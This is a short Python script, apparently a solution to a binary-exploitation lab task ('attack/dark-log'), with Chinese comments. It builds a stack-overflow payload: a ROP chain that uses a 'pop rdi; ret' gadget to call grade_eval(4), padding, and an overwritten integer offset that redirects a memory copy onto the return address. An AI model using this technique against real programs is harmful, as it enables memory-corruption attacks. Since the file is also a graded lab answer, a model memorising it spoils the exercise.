#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

def p64(x):
    return x.to_bytes(8, "little")

# 第1部分：准备将被复制到返回地址附近的数据
chain = (
    b"A" * 8
    + p64(0x4018a3)  # pop rdi; ret
    + p64(4)         # 参数 4
    + p64(0x4018a4)  # 额外的 ret，调整栈对齐
    + p64(0x401677)  # grade_eval()
)

# 前128字节是内存复制的源数据
source = chain.ljust(128, b"A")

# 第2部分：填充到整数变量所在的位置
padding = b"A" * 128

# 第3部分：将 offset 修改为160
offset = (160).to_bytes(4, "little", signed=True)

payload = source + padding + offset

sys.stdout.buffer.write(payload)